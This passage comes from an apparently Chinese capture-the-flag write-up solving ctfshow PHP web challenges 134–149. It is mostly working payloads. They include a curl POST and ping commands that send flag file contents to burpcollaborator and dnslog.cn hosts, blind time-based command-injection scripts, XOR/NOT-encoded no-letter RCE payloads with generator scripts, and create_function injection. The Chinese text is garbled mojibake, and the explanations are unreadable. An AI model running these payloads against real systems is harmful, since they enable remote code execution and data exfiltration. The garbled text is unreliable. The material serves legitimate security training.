-X POST -d&quot;flag=`cat flag.php`&quot; ewe2mcnzf0hwu1l4eepxt26nwe25qu.burpcollaborator.net 1#payload?F=`$F `;ping `ls | grep flag`.zdvlix.dnslog.cn -c 1?F=`$F `;ping `cat flag.php | grep flag`.zdvlix.dnslog.cn -c 1 1.35 Web 134 â€” _POST æ•°ç»„è¦†ç›–1&lt;?phphighlight_file(__FILE__);$key1 = 0;$key2 = 0;if(isset($_GET[&#x27;key1&#x27;]) || isset($_GET[&#x27;key2&#x27;]) || isset($_POST[&#x27;key1&#x27;]) || isset($_POST[&#x27;key2&#x27;])) &#123; die(&quot;nonononono&quot;);&#125;@parse_str($_SERVER[&#x27;QUERY_STRING&#x27;]);extract($_POST);if($key1 == &#x27;36d&#x27; &amp;&amp; $key2 == &#x27;36d&#x27;) &#123; die(file_get_contents(&#x27;flag.php&#x27;));&#125; 1# æµ‹è¯•&lt;?phpparse_str($_SERVER[&#x27;QUERY_STRING&#x27;]);var_dump($_POST);# ä¼ å‚ ?_POST[a]=123 1# payload?_POST[key1]=36d&amp;_POST[key2]=36d 1.36 Web 135 â€” æ— å›æ˜¾å‘½ä»¤æ‰§è¡Œ â€” å†™æ–‡ä»¶ cp nl1web133plus 1&lt;?phperror_reporting(0);highlight_file(__FILE__);//flag.phpif($F = @$_GET[&#x27;F&#x27;])&#123; if(!preg_match(&#x27;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#x27;, $F))&#123; eval(substr($F,0,6)); &#125;else&#123; die(&quot;å¸ˆå‚…ä»¬å±…ç„¶ç ´è§£äº†å‰é¢çš„ï¼Œé‚£å°±æ¥ä¸€ä¸ªåŠ å¼ºç‰ˆå§&quot;); &#125;&#125; 1# payload?F=`$F`; cp flag.php 1.txt# ç„¶åè®¿é—® 1.txt å³å¯?F=`$F `;nl f*&gt;2.txt 1.37 Web 136 â€” æ— å›æ˜¾å‘½ä»¤æ‰§è¡Œ â€” ls|tee xxx1&lt;?phperror_reporting(0);function check($x)&#123; if(preg_match(&#x27;/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\?|\\&#123;|\\&#125;|\\&gt;|\\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;, $x))&#123; die(&#x27;too young too simple sometimes naive!&#x27;); &#125;&#125;if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; check($c); exec($c);&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 1?c=ls|tee xxx 1# tee å‘½ä»¤ https://linux.cn/article-9435-1.htmlping www.baidu.com | tee 1.txtå°†æ­£åœ¨æ‰§è¡Œå‘½ä»¤çš„è¾“å‡ºå†…å®¹ å†™å…¥ æŒ‡å®šæ–‡ä»¶å½“ä¸­# è¿½åŠ å†™å…¥ping www.baidu.com | tee -a 1.txt# å†™å…¥å¤šä¸ªæ–‡ä»¶å½“ä¸­ping www.baidu.com | tee 1.txt 2.txt 3.txtls | tee 2.txt 3.txt 4.txt # è®© tee å‘½ä»¤çš„è¾“å‡ºå†…å®¹ç›´æ¥ä½œä¸ºå¦ä¸€ä¸ªå‘½ä»¤çš„è¾“å…¥å†…å®¹ root@kali:/var/www/html/learn# ls *.txt | tee 5.txt | wc -l4 å‚è€ƒ https://linux.cn/article-9435-1.html 1?c=ls|tee xxx # åè®¿é—® /xxx å°†æ–‡ä»¶ä¸‹è½½ä¸‹æ¥ å¾—åˆ°å½“å‰ç›®å½•ä¹‹ä¸‹ ä»…ä»…æœ‰ index.php 1?c=ls /|tee 111 1?c=cat /f149_15_h3r3|tee 222 1.38 Web 137 â€” call_user_func() ä¼ é€’ å­—ç¬¦ä¸² â€” ç±»å::å‡½æ•°å1&lt;?phperror_reporting(0);highlight_file(__FILE__);class ctfshow&#123; function __wakeup()&#123; die(&quot;private class&quot;); &#125; static function getFlag()&#123; echo file_get_contents(&quot;flag.php&quot;); &#125;&#125;call_user_func($_POST[&#x27;ctfshow&#x27;]); 1# payloadctfshow=ctfshow::getFlagctfshow=ctfshow-&gt;getFlag #ä¸å¯è¡Œ phpä¸­ -&gt;ä¸:: è°ƒç”¨ç±»ä¸­çš„æˆå‘˜çš„åŒºåˆ«-&gt; ç”¨äºåŠ¨æ€è¯­å¢ƒå¤„ç†æŸä¸ªç±»çš„æŸä¸ªå®ä¾‹:: å¯ä»¥è°ƒç”¨ä¸€ä¸ªé™æ€çš„ã€ä¸ä¾èµ–äºå…¶ä»–åˆå§‹åŒ–çš„ç±»æ–¹æ³•. ä¹Ÿå°±æ˜¯è¯´åŒå†’å·å¯ä»¥ä¸ç”¨å®ä¾‹åŒ–ç±»å°±å¯ä»¥ç›´æ¥è°ƒç”¨ç±»ä¸­çš„æ–¹æ³• 1.39 Web 138 â€” call_user_func() ä¼ é€’ æ•°ç»„ â€” ä¸ä½¿ç”¨ ::1&lt;?phperror_reporting(0);highlight_file(__FILE__);class ctfshow&#123; function __wakeup()&#123; die(&quot;private class&quot;); &#125; static function getFlag()&#123; echo file_get_contents(&quot;flag.php&quot;); &#125;&#125;if(strripos($_POST[&#x27;ctfshow&#x27;], &quot;:&quot;)&gt;-1)&#123; die(&quot;private function&quot;);&#125;call_user_func($_POST[&#x27;ctfshow&#x27;]); 1ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag 1# å‡½æ•°ä¼ å‚&lt;?phpfunction barber($type)&#123; echo &quot;You wanted a $type haircut, no problem\\n&quot;;&#125;call_user_func(&#x27;barber&#x27;, &quot;mushroom&quot;);call_user_func(&#x27;barber&#x27;, &quot;shave&quot;);?&gt; //You wanted a mushroom haircut, no problem//You wanted a shave haircut, no problem# ç±»ä¼ æ–¹æ³•&lt;?phpclass myclass &#123; static function say_hello() &#123; echo &quot;Hello!\\n&quot;; &#125;&#125;$classname = &quot;myclass&quot;;call_user_func(array($classname, &#x27;say_hello&#x27;));call_user_func($classname .&#x27;::say_hello&#x27;); // As of 5.2.3$myobject = new myclass();call_user_func(array($myobject, &#x27;say_hello&#x27;));?&gt; 1.40 Web 139 â€” æ— å›æ˜¾å‘½ä»¤æ³¨å…¥ â€” awkã€cut ç›²æ³¨1&lt;?phperror_reporting(0);function check($x)&#123; if(preg_match(&#x27;/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\?|\\&#123;|\\&#125;|\\&gt;|\\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;, $x))&#123; die(&#x27;too young too simple sometimes naive!&#x27;); &#125;&#125;if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; check($c); exec($c);&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; awk cut ç›²æ³¨ å‘½ä»¤ï¼š 1root@kali:~/æ¡Œé¢/111# vi flag.phproot@kali:~/æ¡Œé¢/111# cat flag.php test1test2test3flag&#123;qwertyui&#125;root@kali:~/æ¡Œé¢/111# cat flag.php | awk NR==1test1root@kali:~/æ¡Œé¢/111# cat flag.php | awk NR==2test2root@kali:~/æ¡Œé¢/111# cat flag.php | awk NR==3test3root@kali:~/æ¡Œé¢/111# cat flag.php | awk NR==4flag&#123;qwertyui&#125;root@kali:~/æ¡Œé¢/111# cat flag.php | awk nr==4root@kali:~/æ¡Œé¢/111# cat flag.php | awk NR==4 | cut -c 1froot@kali:~/æ¡Œé¢/111# cat flag.php | awk NR==4 | cut -c 2lroot@kali:~/æ¡Œé¢/111# cat flag.php | awk NR==4 | cut -c 3aroot@kali:~/æ¡Œé¢/111# cat flag.php | awk NR==4 | cut -c 4groot@kali:~/æ¡Œé¢/111# if [ $(cat flag.php|awk NR==1|cut -c 2)==l ];then echo success;fi success root@kali:~/æ¡Œé¢/111# if [ $(cat flag.php|awk NR==1|cut -c 2)==l ];then sleep 2;fi è„šæœ¬ï¼šæŸ¥æ‰¾æ ¹ç›®å½•çš„å†…å®¹ 1import requestsimport timeimport string#str=string.ascii_letters+string.digitsstr = &#x27;abcdefghigklmnopqrstuvwxyz_&#123;&#125;0123456789 &#x27;result=&quot;&quot;for i in range(1,10): key=0 for j in range(1,50): if key==1: break #for n in range(32,128): for n in str: #n=chr(n) #payload=&quot;if [ `ls /|awk &#x27;NR==&#123;0&#125;&#x27;|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi&quot;.format(i,j,n) payload=&quot;if [ `ls /|awk &#x27;NR==&#123;0&#125;&#x27;|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi&quot;.format(i,j,n) #print(payload) url=&quot;http://4b941830-8b3f-49bd-8aa8-0d35e2d2d486.challenge.ctf.show:8080?c=&quot;+payload try: requests.get(url,timeout=(2.5,2.5)) except: result=result+n print(result) break if n==&#x27;9&#x27;: key=1 result+=&quot; &quot; è„šæœ¬ï¼šæŸ¥ flag 1import requestsimport timeimport string#str=string.ascii_letters+string.digitsstr = &#x27;abcdefghigklmnopqrstuvwxyz_&#123;&#125;0123456789 &#x27;result=&quot;&quot;for i in range(1,10): key=0 for j in range(1,50): if key==1: break #for n in range(32,128): for n in str: #n=chr(n) payload=&quot;if [ `cat /f149_15_h3r3|awk &#x27;NR==&#123;0&#125;&#x27;|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi&quot;.format(i,j,n) #payload=&quot;if [ `ls /|awk &#x27;NR==&#123;0&#125;&#x27;|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi&quot;.format(i,j,n) #print(payload) url=&quot;http://4b941830-8b3f-49bd-8aa8-0d35e2d2d486.challenge.ctf.show:8080?c=&quot;+payload try: requests.get(url,timeout=(2.5,2.5)) except: result=result+n print(result) break if n==&#x27;9&#x27;: key=1 result+=&quot; &quot; 1import requestscmd = &#x27;cat /f149_15_h3r3&#x27;result = &#x27;&#x27;for i in range(1, 10): for j in range(1, 50): print(&#x27;i=&#x27;, i, &#x27; j=&#x27;, j) for k in range(32, 128): k = chr(k) payload = f&quot;if [ `&#123;cmd&#125; |awk NR==&#123;i&#125;|cut -c &#123;j&#125;` == &#123;k&#125; ]; then sleep 3;fi&quot; payload = &#x27;?c=&#x27; + payload url = &#x27;http://4b941830-8b3f-49bd-8aa8-0d35e2d2d486.challenge.ctf.show:8080&#x27; try: requests.get(url + payload, timeout=(2.5, 2.5)) except: result = result + k print(result) break result = result + &quot;\\n&quot; 1.41 Web 140 â€” intval($code) == â€˜ctfshowâ€™ â€” $code = eval(â€œreturn $f1($f2());â€);1&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_POST[&#x27;f1&#x27;]) &amp;&amp; isset($_POST[&#x27;f2&#x27;]))&#123; $f1 = (String)$_POST[&#x27;f1&#x27;]; $f2 = (String)$_POST[&#x27;f2&#x27;]; if(preg_match(&#x27;/^[a-z0-9]+$/&#x27;, $f1))&#123; if(preg_match(&#x27;/^[a-z0-9]+$/&#x27;, $f2))&#123; $code = eval(&quot;return $f1($f2());&quot;); if(intval($code) == &#x27;ctfshow&#x27;)&#123; echo file_get_contents(&quot;flag.php&quot;); &#125; &#125; &#125;&#125; æˆ‘ä»¬çš„ç›®çš„æ˜¯ ï¼Œè€Œä¸”åªèƒ½ä½¿ç”¨ å­—æ¯å’Œæ•°å­—è¿›è¡Œæ„é€  1$code = eval(&quot;return $f1($f2());&quot;);if(intval($code) == &#x27;ctfshow&#x27;)&#123; echo file_get_contents(&quot;flag.php&quot;);&#125;# intval() == å¼±ç±»å‹æ¯”è¾ƒï¼Œåªè¦è®© # $code ä¸º 0 | False | NULL å³å¯ # å‡†ç¡®çš„æ¥è¯´ï¼Œåªè¦ä¸æ˜¯æ•°å­—å³å¯ 1# payloadmd5(phpinfo()) #c4ca4238a0b923820dcc509a6f75849b #1md5(sleep()) #d41d8cd98f00b204e9800998ecf8427e #ç©ºå¯†ç md5(md5()) #d41d8cd98f00b204e9800998ecf8427e #ç©ºå¯†ç current(localeconv)sha1(getcwd())#md5(getcwd()) ä¸å¯è¡Œ #247369500707596003b38cd5879122f6f1=intval&amp;f2=intval # 0f1=usleep&amp;f2=usleep 1.42 Web 141 â€” eval(â€œreturn $v1$v3$v2;â€);1&lt;?php#error_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123; $v1 = (String)$_GET[&#x27;v1&#x27;]; $v2 = (String)$_GET[&#x27;v2&#x27;]; $v3 = (String)$_GET[&#x27;v3&#x27;]; if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123; if(preg_match(&#x27;/^\\W+$/&#x27;, $v3))&#123; # v3 ä¸èƒ½æ˜¯ å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ $code = eval(&quot;return $v1$v3$v2;&quot;); echo &quot;$v1$v3$v2 = &quot;.$code; &#125; &#125;&#125; \\w #åŒ¹é…å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ã€‚ç­‰ä»·äº [A-Za-z0-9_] æµ‹è¯•ï¼š 1&lt;?phphighlight_file(__FILE__);# $code = eval(&quot;return $v1$v3$v2;&quot;);// eval(&quot;return 1;phpinfo();&quot;); #ä¸å¯è¡Œ// eval(&quot;return 0;phpinfo();&quot;); #ä¸å¯è¡Œ// eval(&quot;return 1-phpinfo();&quot;); #å¯è¡Œeval(&quot;return 1+phpinfo();&quot;); #å¯è¡Œeval(&quot;return 2+phpinfo();&quot;); #å¯è¡Œ?&gt; # ä¹Ÿå°±æ˜¯è¯´ï¼Œæ•°å­—å¯ä»¥ä¸å‘½ä»¤è¿›è¡Œè¿ç®— ç”±äº v1 v2 ä¹Ÿåªèƒ½æ˜¯ æ•°å­—ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ„é€  1+phpinfo()+1 ç­‰å¼å­ v3 ä¸èƒ½æ˜¯ å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ï¼Œé‚£ä¹ˆç°åœ¨å¦‚ä½•æ„é€  v3? æ— å­—æ¯ã€æ•°å­— RCE 1root@kali:~/æ¡Œé¢/è„šæœ¬# python re.pyè¾“å‡ºæ‰§è¡Œå‡½æ•°:&#x27;system&#x27;è¯·è¾“å‡ºå‡½æ•°å‚æ•°:&#x27;tac f*&#x27;(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;) 1# payload?v1=1&amp;v3=*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# *?v1=1&amp;v3=-(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# -?v1=1&amp;v3=%2b(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# å°è¯•è¿‡å ä¸èƒ½ç›´æ¥ç”¨+ è¦è¿›è¡Œ URL ç¼–ç #+?v1=1&amp;v3=^(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# ^?v1=1&amp;v3=%26(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# &amp; %26?v1=1&amp;v3=%2f(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# / è¿™æ¬¡ç«Ÿç„¶ ç«ç»’æ²¡æœ‰æ‹¦æˆª ä¹Ÿå°±æ˜¯è¯´ï¼ŒåŠ å‡ä¹˜é™¤ï¼Œå–åã€å¼‚æˆ–ï¼Œéƒ½å¯èƒ½ | æ‹¼æ¥ æ— å­—æ¯æ•°å­—è„šæœ¬ 1# -*- coding: utf-8 -*-# @Time : 20.12.4 23:05# @author:lonmarimport recontent = &#x27;&#x27;preg = &#x27;[a-z]|[0-9]&#x27; # é¢˜ç›®è¿‡æ»¤æ­£åˆ™# ç”Ÿæˆå­—å…¸for i in range(256): for j in range(256): if not (re.match(preg, chr(i), re.I) or re.match(preg, chr(j), re.I)): k = i | j if 32 &lt;= k &lt;= 126: a = &#x27;%&#x27; + hex(i)[2:].zfill(2) b = &#x27;%&#x27; + hex(j)[2:].zfill(2) content += (chr(k) + &#x27; &#x27; + a + &#x27; &#x27; + b + &#x27;\\n&#x27;)f = open(&#x27;rce_or.txt&#x27;, &#x27;w&#x27;)f.write(content)while True: payload1 = &#x27;&#x27; payload2 = &#x27;&#x27; code = input(&quot;data:&quot;) for i in code: f = open(&#x27;rce_or.txt&#x27;) lines = f.readlines() for line in lines: if i == line[0]: payload1 = payload1 + line[2:5] payload2 = payload2 + line[6:9] break payload = &#x27;(&quot;&#x27;+payload1+&#x27;&quot;|&quot;&#x27;+payload2+&#x27;&quot;)&#x27; print(&quot;payload: &quot;+ payload) 1.43 Web 142 â€” $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);1&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#x27;v1&#x27;]))&#123; $v1 = (String)$_GET[&#x27;v1&#x27;]; if(is_numeric($v1))&#123; $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d); sleep($d); echo file_get_contents(&quot;flag.php&quot;); &#125;&#125; 1?v1=0 1.44 Web 143 â€” 141 plus1141çš„plusç‰ˆæœ¬ 1&lt;?phphighlight_file(__FILE__);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123; $v1 = (String)$_GET[&#x27;v1&#x27;]; $v2 = (String)$_GET[&#x27;v2&#x27;]; $v3 = (String)$_GET[&#x27;v3&#x27;]; if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123; if(preg_match(&#x27;/[a-z]|[0-9]|\\+|\\-|\\.|\\_|\\||\\$|\\&#123;|\\&#125;|\\~|\\%|\\&amp;|\\;/i&#x27;, $v3))&#123; die(&#x27;get out hacker!&#x27;); &#125; else&#123; $code = eval(&quot;return $v1$v3$v2;&quot;); echo &quot;$v1$v3$v2 = &quot;.$code; &#125; &#125;&#125; è¿‡æ»¤äº†ä¸€äº›è¿ç®—ç¬¦ + - &amp; % / ~ $ _ . è¿‡æ»¤äº† ; ï¼Œä½¿ç”¨ ?&gt; ä»£æ›¿ ä»æ—§æœ‰æˆ‘ä»¬å¯ä»¥åˆ©ç”¨çš„ 1# payload?v1=1&amp;v3=*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# *?v1=1&amp;v3=^(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# ^?v1=1&amp;v3=%2f(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# / è¿™æ¬¡ç«Ÿç„¶ ç«ç»’æ²¡æœ‰æ‹¦æˆª ^å¼‚æˆ–æ‹¼æ¥ æ— å­—æ¯æ•°å­—è„šæœ¬ 1# -*- coding: utf-8 -*-# @Time : 20.12.4 23:06# @author:lonmarimport recontent = &#x27;&#x27;preg = &#x27;/[a-z]|[0-9]|\\+|\\-|\\.|\\_|\\||\\$|\\&#123;|\\&#125;|\\~|\\%|\\&amp;|\\;/&#x27; # é¢˜ç›®è¿‡æ»¤æ­£åˆ™# ç”Ÿæˆå­—å…¸for i in range(256): for j in range(256): if not (re.match(preg, chr(i), re.I) or re.match(preg, chr(j), re.I)): k = i ^ j if 32 &lt;= k &lt;= 126: a = &#x27;%&#x27; + hex(i)[2:].zfill(2) b = &#x27;%&#x27; + hex(j)[2:].zfill(2) content += (chr(k) + &#x27; &#x27; + a + &#x27; &#x27; + b + &#x27;\\n&#x27;)f = open(&#x27;exp_xor.txt&#x27;, &#x27;w&#x27;)f.write(content)while True: payload1 = &#x27;&#x27; payload2 = &#x27;&#x27; code = input(&quot;data:&quot;) for i in code: f = open(&#x27;rce_or.txt&#x27;) lines = f.readlines() for line in lines: if i == line[0]: payload1 = payload1 + line[2:5] payload2 = payload2 + line[6:9] break payload = &#x27;(&quot;&#x27;+payload1+&#x27;&quot;^&quot;&#x27;+payload2+&#x27;&quot;)&#x27; print(&quot;payload: &quot;+ payload) 1.45 Web 144 â€” 143 plus1143çš„plusç‰ˆæœ¬ 1&lt;?phphighlight_file(__FILE__);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123; $v1 = (String)$_GET[&#x27;v1&#x27;]; $v2 = (String)$_GET[&#x27;v2&#x27;]; $v3 = (String)$_GET[&#x27;v3&#x27;]; if(is_numeric($v1) &amp;&amp; check($v3))&#123; if(preg_match(&#x27;/^\\W+$/&#x27;, $v2))&#123; $code = eval(&quot;return $v1$v3$v2;&quot;); echo &quot;$v1$v3$v2 = &quot;.$code; &#125; &#125;&#125;function check($str)&#123; return strlen($str)===1?true:false;&#125; 1#payload ?v1=1&amp;v3=%2f(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# / è¿™æ¬¡ç«Ÿç„¶ ç«ç»’æ²¡æœ‰æ‹¦æˆª?v1=1&amp;v2=%00*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v3=1# %00*?v1=1&amp;v2=^(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v3=1# ^ 1.46 Web 145 â€” 144 plus1144çš„plusç‰ˆæœ¬ 1&lt;?phphighlight_file(__FILE__);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123; $v1 = (String)$_GET[&#x27;v1&#x27;]; $v2 = (String)$_GET[&#x27;v2&#x27;]; $v3 = (String)$_GET[&#x27;v3&#x27;]; if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123; if(preg_match(&#x27;/[a-z]|[0-9]|\\@|\\!|\\+|\\-|\\.|\\_|\\$|\\&#125;|\\%|\\&amp;|\\;|\\&lt;|\\&gt;|\\*|\\/|\\^|\\#|\\&quot;/i&#x27;, $v3))&#123; die(&#x27;get out hacker!&#x27;); &#125; else&#123; $code = eval(&quot;return $v1$v3$v2;&quot;); echo &quot;$v1$v3$v2 = &quot;.$code; &#125; &#125;&#125; è¿‡æ»¤äº† ; ^ &lt; &quot; &gt; å’Œæˆ‘ä»¬èƒ½ç”¨åˆ°çš„è¿ç®—ç¬¦ ä½¿ç”¨ | ? ç»•è¿‡ ~ è„šæœ¬ 1&lt;?php//åœ¨å‘½ä»¤è¡Œä¸­è¿è¡Œ/*author yu22x*/fwrite(STDOUT,&#x27;[+]your function: &#x27;);$system=str_replace(array(&quot;\\r\\n&quot;, &quot;\\r&quot;, &quot;\\n&quot;), &quot;&quot;, fgets(STDIN)); fwrite(STDOUT,&#x27;[+]your command: &#x27;);$command=str_replace(array(&quot;\\r\\n&quot;, &quot;\\r&quot;, &quot;\\n&quot;), &quot;&quot;, fgets(STDIN)); echo &#x27;[*] (~&#x27;.urlencode(~$system).&#x27;)(~&#x27;.urlencode(~$command).&#x27;);&#x27;; ä¸‰ç›®è¿ç®—ç¬¦ 1eval(&quot;return 1?phpinfo():1;&quot;); #å¯è¡Œ 1#payload ?v1=1&amp;v3=?(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5):&amp;v2=1 1.47 Web 146 â€” 145 plus1145çš„plusç‰ˆæœ¬ 1&lt;?phphighlight_file(__FILE__);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123; $v1 = (String)$_GET[&#x27;v1&#x27;]; $v2 = (String)$_GET[&#x27;v2&#x27;]; $v3 = (String)$_GET[&#x27;v3&#x27;]; if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123; if(preg_match(&#x27;/[a-z]|[0-9]|\\@|\\!|\\:|\\+|\\-|\\.|\\_|\\$|\\&#125;|\\%|\\&amp;|\\;|\\&lt;|\\&gt;|\\*|\\/|\\^|\\#|\\&quot;/i&#x27;, $v3))&#123; die(&#x27;get out hacker!&#x27;); &#125; else&#123; $code = eval(&quot;return $v1$v3$v2;&quot;); echo &quot;$v1$v3$v2 = &quot;.$code; &#125; &#125;&#125; è¿‡æ»¤äº† : ä¸èƒ½ä½¿ç”¨ä¸‰ç›®è¿ç®—ç¬¦äº† æµ‹è¯• 1&lt;?phphighlight_file(__FILE__);// eval(&quot;return 1==phpinfo()||1;&quot;); #å¯è¡Œ// eval(&quot;return 1==phpinfo()|1;&quot;); #å¯è¡Œ// eval(&quot;return 1===phpinfo()|1;&quot;); #å¯è¡Œ// eval(&quot;return 1===phpinfo()||1;&quot;); #å¯è¡Œ eval(&quot;return 1=phpinfo()||1;&quot;); #ä¸å¯è¡Œ//eval(&quot;return 1=phpinfo()||1;&quot;); #ä¸å¯è¡Œ 1# payload?v1=1&amp;v3===(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)|&amp;v2=1 1.48 Web 147 â€” create_function å‘½ä»¤æ³¨å…¥1&lt;?phphighlight_file(__FILE__);if(isset($_POST[&#x27;ctf&#x27;]))&#123; $ctfshow = $_POST[&#x27;ctf&#x27;]; if(!preg_match(&#x27;/^[a-z0-9_]*$/isD&#x27;,$ctfshow)) &#123; $ctfshow(&#x27;&#x27;,$_GET[&#x27;show&#x27;]); &#125;&#125; create_function() 1create_function(&#x27;$a&#x27;,&#x27;echo $a.&quot;123&quot;&#x27;)ç±»ä¼¼äºfunction f($a) &#123; echo $a.&quot;123&quot;;&#125; é‚£ä¹ˆå¦‚æœæˆ‘ä»¬ç¬¬äºŒä¸ªå‚æ•°ä¼ å…¥ echo 1;}phpinfo();//å°±ç­‰ä»·äº 1function f($a) &#123; echo 1;&#125;phpinfo();//&#125;ä»è€Œæ‰§è¡Œphpinfo()å‘½ä»¤ 1# payloadGET ?show=2;&#125;system(&quot;tac f*&quot;);/*POST ctf=\\create_function# \\ %5c 1.49 Web 148 â€” ä¸­æ–‡å˜é‡1&lt;?phpinclude &#x27;flag.php&#x27;;if(isset($_GET[&#x27;code&#x27;]))&#123; $code=$_GET[&#x27;code&#x27;]; if(preg_match(&quot;/[A-Za-z0-9_\\%\\\\|\\~\\&#x27;\\,\\.\\:\\@\\&amp;\\*\\+\\- ]+/&quot;,$code))&#123; die(&quot;error&quot;); &#125; @eval($code);&#125;else&#123; highlight_file(__FILE__);&#125;function get_ctfshow_fl0g()&#123; echo file_get_contents(&quot;flag.php&quot;);&#125; æœªè¿‡æ»¤ ^ ; ï¼Œå¯ç›´æ¥å¼‚æˆ–æ„é€  1# payload?code=(&quot;%08%02%08%09%05%0d&quot;^&quot;%7b%7b%7b%7d%60%60&quot;)(&quot;%09%01%03%01%06%02&quot;^&quot;%7d%60%60%21%60%28&quot;); åˆ©ç”¨ä¸­æ–‡å˜é‡ 1?code=$å“ˆ=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$å“ˆ&#125;[å“¼]($&#123;$å“ˆ&#125;[å—¯]);&amp;å“¼=system&amp;å—¯=tac f*å…¶å®ä¹Ÿæ˜¯åˆ©ç”¨å¼‚æˆ–æ„é€ &quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;; å¼‚æˆ–å‡ºæ¥çš„ç»“æœæ˜¯ _GET 1.50 Web 149 â€” æ¡ä»¶ç«äº‰ 1&lt;?phperror_reporting(0);highlight_file(__FILE__);$files = scandir(&#x27;./&#x27;); foreach($files as $file) &#123; if(is_file($file))&#123; if ($file !== &quot;index.php&quot;) &#123; unlink($file); &#125; &#125;&#125;file_put_contents($_GET[&#x27;ctf&#x27;], $_POST[&#x27;show&#x27;]);$files = scandir(&#x27;./&#x27;); foreach($files as $file) &#123; if(is_file($file))&#123; if ($file !== &quot;index.php&quot;) &#123; unlink($file); &#125; &#125;&#125; 